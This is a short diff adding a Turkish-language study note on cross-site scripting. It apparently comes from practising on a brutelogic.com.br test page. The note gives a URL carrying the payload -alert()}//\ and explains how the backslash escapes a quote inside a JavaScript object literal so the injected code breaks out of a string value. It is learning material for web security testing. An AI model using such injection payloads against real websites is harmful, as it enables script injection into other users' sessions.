@@ -1,0 +1,11 @@
+https://brutelogic.com.br/multi/js-object.php?p=-alert()}//\
+
+
+{ a:"-alert()}//\", b:"-alert()}//\"}
+
+
+\ yaptıgımız zaman " ifadesini yok sayıyor.
+yani bu kısım 
+
+a:"-alert()}//\", b:" hepsini string olarak kabul ediyor. b den kurtulmus olduk
+
